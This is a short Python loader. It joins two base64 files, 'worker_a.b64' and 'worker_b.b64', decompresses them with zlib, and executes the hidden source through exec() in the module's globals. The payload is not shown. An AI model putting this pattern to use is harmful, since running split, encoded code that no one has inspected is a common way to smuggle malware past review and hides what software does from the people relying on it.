import zlib, base64
from pathlib import Path
_dir = Path(__file__).parent
_b = (_dir / "worker_a.b64").read_text() + (_dir / "worker_b.b64").read_text()
_src = zlib.decompress(base64.b64decode(_b)).decode("utf-8")
exec(compile(_src, __file__, "exec"), globals())
